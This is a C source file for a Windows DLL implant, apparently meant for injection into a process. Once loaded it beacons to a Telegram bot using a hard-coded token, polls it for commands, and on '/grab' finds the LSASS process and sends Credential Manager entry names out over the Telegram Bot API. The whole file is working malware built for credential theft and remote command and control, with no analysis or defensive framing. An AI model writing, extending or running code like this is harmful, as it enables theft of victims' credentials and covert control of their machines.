#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <wincred.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "credui.lib")

// --- CONFIGURATION ---
const char* TELEGRAM_TOKEN = "8408021414:AAFxsfM6IJ3C8nYg0iJ-oZoz6ozwv-f-Tyk";
const char* CHAT_ID = "634812345"; // NOTE: Chat ID is usually required for sendMessage

// --- HELPERS ---

void SendTelegramMessage(const char* text) {
    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) return;

    char url[2048];
    sprintf_s(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", 
              TELEGRAM_TOKEN, CHAT_ID, text);

    HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (hUrl) {
        InternetCloseHandle(hUrl);
    }
    InternetCloseHandle(hInet);
}

// --- CREDENTIAL HARVESTING ---

void CollectAndReportCredentials() {
    char report[4096] = "--- CREDS REPORT ---\n";
    
    // 1. Process List (Example finding LSASS)
    DWORD lsassPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                lsassPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    
    if (lsassPid) {
        strcat_s(report, sizeof(report), "[*] LSASS found.\n");
    }

    // 2. CredMan Enumeration
    DWORD dwCount = 0;
    PCREDENTIALW* pCredentials = NULL;
    if (CredEnumerateW(NULL, 0, &dwCount, &pCredentials)) {
        char entry[256];
        sprintf_s(entry, sizeof(entry), "[*] CredMan entries: %d\n", dwCount);
        strcat_s(report, sizeof(report), entry);
        
        for (DWORD i = 0; i < min(dwCount, 5); i++) {
            char user[128];
            WideCharToMultiByte(CP_UTF8, 0, pCredentials[i]->TargetName, -1, user, 128, NULL, NULL);
            strcat_s(report, sizeof(report), " - ");
            strcat_s(report, sizeof(report), user);
            strcat_s(report, sizeof(report), "\n");
        }
        CredFree(pCredentials);
    }

    SendTelegramMessage(report);
}

// --- MAIN PAYLOAD LOOP ---

void BeaconLoop() {
    SendTelegramMessage("Payload_Injected_Successfully");

    while (TRUE) {
        // Polling para comandos (Simplificado: solo busca '/grab' o '/exec')
        HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInet) {
            char url[1024];
            sprintf_s(url, sizeof(url), "https://api.telegram.org/bot%s/getUpdates?limit=1&offset=-1", TELEGRAM_TOKEN);
            
            HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
            if (hUrl) {
                char buffer[4096] = {0};
                DWORD bytesRead;
                if (InternetReadFile(hUrl, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    
                    if (strstr(buffer, "/grab")) {
                        CollectAndReportCredentials();
                    }
                    else if (strstr(buffer, "/ping")) {
                        SendTelegramMessage("PONG");
                    }
                }
                InternetCloseHandle(hUrl);
            }
            InternetCloseHandle(hInet);
        }
        
        Sleep(60000); // Esperar 1 minuto entre beacons
    }
}

// Entry point para ser usado como DLL o inyectado directamente (si se ajusta a PIC)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BeaconLoop, NULL, 0, NULL);
    }
    return TRUE;
}
